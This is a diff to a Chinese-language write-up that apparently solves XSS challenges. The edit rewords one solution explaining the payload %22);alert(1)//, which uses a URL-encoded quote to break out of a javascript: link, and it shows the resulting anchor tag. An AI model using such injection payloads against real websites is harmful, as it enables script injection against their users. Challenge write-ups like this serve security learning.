@@ -112,15 +112,15 @@ function escape(s) {
   a.click();
 }
 ```
-这个有点意思，先上payload吧
+payload
 ```html
 %22);alert(1)//
 ```
-`url`是放到`a`标签的`href`属性中执行的，`href`属性用于指定超链接目标的URL，是支持URL编码的，`%22`是双引号`"`的URL编码，最后构造出的`a`标签为
+`%22`是双引号`"`的URL编码，利用```javascript:```伪协议支持URL编码
+Output
 ```html
 <a href=javascript:console.log("%22);alert(1)//")></a>
 ```
-`a.click()`执行的时候触发了alert(1)
 
 <a name="a005"/></a>
 ### Markdown (31)
